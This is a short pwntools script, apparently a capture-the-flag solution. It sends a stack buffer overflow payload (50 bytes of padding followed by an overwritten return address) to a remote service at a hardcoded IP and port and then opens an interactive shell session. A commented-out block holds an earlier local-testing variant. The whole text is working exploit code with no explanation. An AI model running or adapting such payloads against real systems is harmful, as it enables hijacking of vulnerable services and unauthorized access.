from pwn import *
"""
#p = remote('37.128.230.46', 50023)
p = process('./client.out')
#s="A"*50+p32(0x08048C11)+p32(0x4)
s="A"*50+p32(0x0)+"\x00"*40

with open('input', 'w') as f:f.write(s)
p.sendline(s)
p.interactive()
"""

from pwn import *

p = remote('37.128.230.46', 50023)
#p = process('./client.out')
s="A"*50+p32(0x08048C11+47)+p32(0x4)
p.sendline(s)
p.interactive()
